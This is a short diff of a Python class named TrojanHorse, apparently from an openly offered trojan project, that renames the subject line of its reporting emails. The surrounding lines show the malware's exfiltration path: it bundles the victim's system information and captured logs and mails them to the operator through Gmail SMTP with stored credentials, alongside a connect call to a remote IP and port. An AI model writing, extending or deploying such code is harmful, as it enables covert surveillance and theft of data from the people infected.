@@ -103,7 +103,7 @@ class TrojanHorse:
             self.connect(self.ip, self.port)
         
     def send_mail(self, message):
-        message = "Subject: TechnowHorse Reporting\n\n" + "Report From:\n\n" + self.system_info  + "\n\nLogs:\n" + message
+        message = "Subject: THorse Reporting\n\n" + "Report From:\n\n" + self.system_info  + "\n\nLogs:\n" + message
         server = smtplib.SMTP("smtp.gmail.com", 587)
         server.starttls()
         server.login(self.email, self.password)
@@ -114,7 +114,7 @@ class TrojanHorse:
         msg = MIMEMultipart()
         msg['From'] = self.email
         msg['To'] = self.email  
-        msg['Subject'] = "TechnowHorse Reporting With Attachments"
+        msg['Subject'] = "THorse Reporting With Attachments"
         text = "\nReport From:\n\n" + self.system_info 
         msg.attach(MIMEText(text))
 
